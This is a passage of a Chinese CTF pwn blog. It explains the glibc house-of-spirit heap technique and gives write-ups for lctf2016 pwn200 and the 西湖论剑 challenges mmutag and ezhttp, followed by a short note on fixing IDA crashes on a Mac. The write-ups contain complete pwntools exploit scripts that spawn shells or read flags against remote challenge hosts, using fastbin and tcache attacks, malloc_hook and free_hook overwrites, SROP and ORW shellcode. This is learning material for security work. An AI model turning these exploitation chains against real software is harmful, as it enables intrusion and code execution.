class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span>  <span class="hljs-comment">//现在我们将通过有着fake first chunks的fake区域地址来覆写我们的指针</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//要注意的是,chunk必须是16字节对齐的</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n"</span>);    a = &amp;fake_chunks[<span class="hljs-number">2</span>];    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Freeing the overwritten pointer.n"</span>);    <span class="hljs-built_in">free</span>(a);  <span class="hljs-comment">//现在下一次的malloc就将会返回我们的fake chunk了</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc(0x30): %pn"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));&#125;</code></pre></div><p>正常的hos是需要伪造两个chunk的。</p><div class="hljs"><pre><code class="hljs c">This file demonstrates the house of spirit attack.Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake 'fastbin' region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298.This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260!malloc(0x30): 0x7ffe23a56260</code></pre></div><p>程序首先初始化了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的<code>fake_chunks</code></p><p>程序先在<code>fake_chunks[1]</code>的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确)</p><p>之后又在下一处伪造了第二个chunk,即从<code>fake_chunks[8]</code>开始的地方,这是为什么呢,因为我们第一个fake chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是<code>fake_chunks+8</code>的地方伪造第二个chunk。</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>使用该技术分配 chunk 到指定地址，使目标位置成为可控区域，关键是要能够修改指定地址的前后的内容，伪造出2个堆，使其可以绕过对应的检测。</p><p>还有就是要有办法覆盖堆指针，到目标地址。</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>开头不输入<code>\n</code>，填充48字符可以泄露出stack地址</li><li>有第一段可控的栈，且可以覆盖到heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li></ul><p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li></ul><p>可以先看一下可控栈的内存情况,<strong>此前id输入的是65</strong>：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Sy4TQJ.png" srcset="/img/loading.gif" alt><br>前0x40为可控区域，箭头指的方向是可以覆盖的堆指针，id的上方有一个ret address，其在输入3退出时可以跳转到。所以其为目标地址，其前面有可控的0x40的区域，后面也有一个id 0x8的可控区域，满足条件 开始构造：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/fO0l4K.png" srcset="/img/loading.gif" alt></p><p>这样free一下就会有个进入fastbin 在栈上的fake堆，申请上去即可修改到目标区域。</p><ul><li>修改ret addree为shellcode的地址。其可以在第一次让你输入时，放入栈中。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/199468#h2-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199468#h2-19</a><br><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>House系列</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>西湖论剑部分wp</title>
    <link href="/2020/10/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/10/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑部分wp"><a href="#西湖论剑部分wp" class="headerlink" title="西湖论剑部分wp"></a>西湖论剑部分wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>给了一个栈地址</li><li>没有show函数</li><li>free 函数存在uaf</li><li>add函数只能申请堆号为1-10的堆块，大小仅为0x68</li><li>可以给栈上读一段数据</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span></code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )      <span class="hljs-keyword">break</span>;    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>uLL);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your content: %s\n"</span>, &amp;buf);</code></pre></div><p>利用这个可以泄漏栈上的数据，也可以在栈上写一定的数据。</p><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>如何泄漏libc地址。</p><p>栈上是有很多数据的，可以用choice 3进行泄漏一定的数据，但是由于<code>\x00</code>的截断，泄漏一个stack地址后，其后有用的libc地址没办法泄漏。</p><p>看下其栈情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IqyiLw.png" srcset="/img/loading.gif" alt><br>可控区域0x20，如果可以填充其中无用的数据到libc地址，再利用一次 choice 3 即可完成泄漏。</p><p>现在也已经知道了stack的地址。伪造一个0x70的堆，然后fastbin attack即可申请到这栈上的内存。然后填充，获取libc地址。接着攻击malloc hook即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./mmutag'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.61'</span>,<span class="hljs-number">55704</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_introduce</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'your introduce'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x60</span>sa(<span class="hljs-string">'name'</span>,data)ru(<span class="hljs-string">'0x'</span>)leak_libc = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0</span>)s(payload)add(<span class="hljs-number">4</span>,p64(leak_stack - <span class="hljs-number">0x40</span>))add(<span class="hljs-number">5</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">6</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x47</span> + <span class="hljs-string">'2'</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)s(<span class="hljs-string">'1'</span> * <span class="hljs-number">0x20</span>)info_addr(<span class="hljs-string">'leak-stack'</span>,leak_stack)ru(<span class="hljs-string">'2'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20840</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)malloc_hook  = <span class="hljs-number">0x3c4aed</span> + libc_baseadd(<span class="hljs-number">3</span>,p64(malloc_hook))add(<span class="hljs-number">8</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">3</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-string">'\x00'</span> + p64(one)add(<span class="hljs-number">10</span>,payload)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">3</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><p>最后因为没有堆可以申请，可以故意触发报错，其会调用到malloc来储存部分数据，此时也就可以get shell。</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>看起来较为复杂，因为实现了一个对Http packet的交互，让我这种不是很熟悉http packet，coding能力差的人，逆向起来有点吃力。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><ul><li>简易的Http packet结构</li><li><code>setcontext</code> 函数的exploit</li><li>各种不熟悉的字符串处理函数<code>sscanf strchr strtok</code> </li></ul><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul><li>开头初始化，开启了沙箱，只能orw来获取flag</li><li>add函数，以输入的字符数量来给你分配堆，所以<code>\x00</code>用不了了，最大0x100，且给了heap的地址</li><li>del 函数，存在uaf</li><li>无show函数</li><li>edit函数，可以输入<code>\x00</code>的字符，无vul</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>free 0x100的chunk 8次，使其进入unsortbin，留着攻击stdout</li><li>tcache attack 攻击到<code>_IO_2_1_stdout_</code> ，使其泄漏libc地址</li><li>tcache attack 攻击free hook，写上setcontext + 53 ，准备srop进行攻击</li><li>srop读入mprotect的rop chain，开启heap段的执行权限</li><li>edit 一个heap的内存为 orw flag</li><li>触发free hook，orw get flag</li></ul><h3 id="细节集合"><a href="#细节集合" class="headerlink" title="细节集合"></a>细节集合</h3><h4 id="对于stdout的攻击"><a href="#对于stdout的攻击" class="headerlink" title="对于stdout的攻击"></a>对于stdout的攻击</h4><p>其中，在利用libc残留伪造stdout地址作为fd的时候，只要改3字节，其肯定是申请的0x20的堆，但是上stdout结构体时需要0x21字节的写入。<br>tcache分配中，并不验证堆的大小，只要fd指好就OK了，所以申请个至少可以写入0x21字节的堆即可。但是由于程序分配chunk的策略，申请时肯定要写数据，写什么不会crush。个人做的时候,乱填充数据，crush了很多次，头都炸了。可以看一下<code>_IO_2_1_stdout_</code>结构体：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; ptype stdout<span class="hljs-built_in">type</span> = struct <span class="hljs-variable">_IO_FILE</span> &#123;    int <span class="hljs-variable">_flags</span>;    char *<span class="hljs-variable">_IO_read_ptr</span>;    char *<span class="hljs-variable">_IO_read_end</span>;    char *<span class="hljs-variable">_IO_read_base</span>;    char *<span class="hljs-variable">_IO_write_base</span>;      char *<span class="hljs-variable">_IO_write_ptr</span>;       char *<span class="hljs-variable">_IO_write_end</span>;    char *<span class="hljs-variable">_IO_buf_base</span>;    char *<span class="hljs-variable">_IO_buf_end</span>;    char *<span class="hljs-variable">_IO_save_base</span>;    char *<span class="hljs-variable">_IO_backup_base</span>;    char *<span class="hljs-variable">_IO_save_end</span>;    struct <span class="hljs-variable">_IO_marker</span> *<span class="hljs-variable">_markers</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_chain</span>;    int <span class="hljs-variable">_fileno</span>;    int <span class="hljs-variable">_flags2</span>;    <span class="hljs-variable">__off_t</span> <span class="hljs-variable">_old_offset</span>;    unsigned short <span class="hljs-variable">_cur_column</span>;    signed char <span class="hljs-variable">_vtable_offset</span>;    char <span class="hljs-variable">_shortbuf</span>[<span class="hljs-number">1</span>];    <span class="hljs-variable">_IO_lock_t</span> *<span class="hljs-variable">_lock</span>;    <span class="hljs-variable">__off64_t</span> <span class="hljs-variable">_offset</span>;    struct <span class="hljs-variable">_IO_codecvt</span> *<span class="hljs-variable">_codecvt</span>;    struct <span class="hljs-variable">_IO_wide_data</span> *<span class="hljs-variable">_wide_data</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_freeres_list</span>;    void *<span class="hljs-variable">_freeres_buf</span>;    size_t <span class="hljs-variable">__pad5</span>;    int <span class="hljs-variable">_mode</span>;    char <span class="hljs-variable">_unused2</span>[<span class="hljs-number">20</span>];&#125; *</code></pre></div><p>在学习io file相关知识时，可以了解到对于获取和输出信息，很重要的就是开头<code>_flags</code> ，其决定了此时io的状况。</p><p>其中注意到<code>_flags</code> 大小是int型，所以在libc地址其读取和验证将要做什么时，是以int的宽度来获取的。所以设置对低位8字节即可。比如<code>0xfffffffffbad3c80</code> <code>0x12345678fbad3c80</code> ,剩下的就好说了，全弄成<code>a</code>的垃圾字符堆。</p><p>然后再次edit，这个<code>_IO_2_1_stdout_</code>即可泄漏出libc地址。</p><h4 id="改free-hook写setcontext时的细节"><a href="#改free-hook写setcontext时的细节" class="headerlink" title="改free hook写setcontext时的细节"></a>改free hook写setcontext时的细节</h4><p>其中需要注意一下libc版本，在最低的libc 2.27版本中，其经常是以<code>0xXXXXXXX00a0</code>这样的存在。直接改写时，<code>/x00</code>被截断，写不上free hook。然后想着用edit 进行修改。但是会发现，此时坏的free hook情况下，用edit直接crush。</p><p>考虑升级一下libc版本号对应对赛题服务器的libc版本，但是libc2.27最近更新了，直接<code>apt upgrade libc6</code> 就会升级到libc 2.27:1.3最新版本，其增加了对double free的检测，就直接做不了了。</p><p>apt 指定版本的升级：</p><div class="hljs"><pre><code class="hljs undefined">apt-cache madison libc6                  apt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6</span>=2.27-3ubuntu1.2 apt-cache madison libc6-dbgapt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6-dbg</span>=2.27-3ubuntu1.2</code></pre></div><p>这样就升级好了，并且解决了个人写setcontext的问题，因为其地址没有再有``x00<div class="hljs"><pre><code class="hljs 。">### exp```python#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &apos;./ezhttp&apos;elf = ELF(local_file)context.log_level = &apos;debug&apos;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&apos;172.17.0.2&apos;,23946)    libc = elf.libc    #libc = ELF(&apos;.&apos;)context.arch = elf.archcontext.terminal = [&apos;tmux&apos;,&apos;neww&apos;]#,&apos;&apos;splitw&apos;,&apos;-h&apos;arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &apos;\0&apos;))uu64    = lambda data               :u64(data.ljust(8, &apos;\0&apos;))info_addr = lambda tag, addr        :io.info(tag + &apos;==&gt;&apos; +&apos;: &#123;:#x&#125;&apos;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&apos;b main&apos;)    gdb.attach(io)    pause()# debug()def add(data):    content = &apos;POST\n&apos;    content += &apos;/create \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;content=&apos;+str(data)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))    sleep(0.05)def free(index):    content = &apos;POST\n&apos;    content += &apos;/del \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+str(index)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))def edit(idx,data):    content = &apos;POST\n&apos;    content += &apos;/edit \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+ str(idx) + &apos;&amp;content=&apos;+str(data)+ &apos;\n&apos;    s(str(content))    sleep(0.05)def leak_addr():    payload = &apos;1&apos; *0x100    add(payload)     ru(&apos;0x&apos;)    heap_base = int(r(12),16) - 0x10    info_addr(&apos;heap_base&apos;,heap_base)    add(payload)     add(&apos;1&apos;*0x8)     add(&apos;1&apos;*0xf8)    for i in range(7):        free(0)    free(0)    add(&apos;\x60\xa7&apos;)     add(&apos;1&apos;*0x18)     add(&apos;1&apos;*0x20)     free(6)    free(6)    add(&apos;1&apos;*0x20)     payload = p64(heap_base + 0x10)    edit(7,payload)    add(&apos;1&apos;*0x20)     # debug()    add(&apos;1&apos;*0x20)     sleep(0.1)    payload = p64(0x12345678fbad3c80) + &apos;\x01&apos; *0x20    add(payload) #8    payload = p64(0xfbad3c80) + p64(0) * 3 + &apos;\x00&apos;    edit(10,payload)    add(&apos;1&apos;*0x90)    return heap_baseleak = 0while True:    try:        heap_base = leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&apos;&apos;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&apos;&apos;)        break    except Exception:        io.close()        io = process(&apos;./ezhttp&apos;)        continueleak = leak &gt;&gt; 16info_addr(&apos;leak&apos;,leak)libc_base = leak - 0x3eb780info_addr(&apos;libc_base&apos;,libc_base)free_hook = 0x3ed8e8 + libc_baseset_context = libc.sym[&apos;setcontext&apos;] + 53 + libc_baseinfo_addr(&apos;heap_base&apos;,heap_base)info_addr(&apos;context&apos;,set_context)orw = shellcraft.open(&apos;./flag&apos;)orw +=shellcraft.read(&apos;rax&apos;,heap_base+0x300,0x30)orw +=shellcraft.write(1,heap_base+0x300,0x30)edit(11,asm(orw))# debug()frame = SigreturnFrame()frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rsp = free_hookframe.rip = libc_base + libc.search(asm(&quot;syscall \nret&quot;)).next()edit(1,str(frame))free(2)free(2)free(2)# debug()add(p64(free_hook))add(&apos;1&apos;*6)info_addr(&apos;context&apos;,set_context)add(p64(set_context))# debug()free(1)pop_rdi = 0x000000000002155f+libc_basepop_rsi = 0x0000000000023e8a+libc_basepop_rdx = libc_base+0x0000000000001b96pop_rax = libc_base+0x0000000000043a78payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&apos;mprotect&apos;],heap_base+0x80])s(payload)itr()</code></pre></div></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mac 上ida 7.0 闪退 打不开 解决办法</title>
    <link href="/2020/10/06/mac%20%E4%B8%8Aida%207.0%20%E9%97%AA%E9%80%80%20%E6%89%93%E4%B8%8D%E5%BC%80%20%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <url>/2020/10/06/mac%20%E4%B8%8Aida%207.0%20%E9%97%AA%E9%80%80%20%E6%89%93%E4%B8%8D%E5%BC%80%20%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="mac-上ida-7-0-闪退-打不开-解决办法"><a href="#mac-上ida-7-0-闪退-打不开-解决办法" class="headerlink" title="mac 上ida 7.0 闪退 打不开 解决办法"></a>mac 上ida 7.0 闪退 打不开 解决办法</h1><h2 id="情景1"><a href="#情景1" class="headerlink" title="情景1"></a>情景1</h2><p>下载以后直接不能用的。</p><p><a href="https://github.com/fjh658/IDA7.0_SP" target="_blank" rel="noopener">https://github.com/fjh658/IDA7.0_SP</a></p><p><a href="https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15" target="_blank" rel="noopener">https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15</a></p><p>参考这个两个github的项目即可。</p><h2 id="情景2"><a href="#情景2" class="headerlink" title="情景2"></a>情景2</h2><p>平时正常使用，突然因为装了冲突的插件打不开ida，直接crash。或者莫名点击ida图标就没有任何反应。进入ida.app bin 下的ida，双击执行命令行中，会显示内核错误的情况。</p><div class="hljs"><pre><code class="hljs python">~ cd .idapro ~/.idapro  rm -rf ida.reg</code></pre></div><p>这样就可以解决了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF 刷题记录</title>
    <link href="/2020/09/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
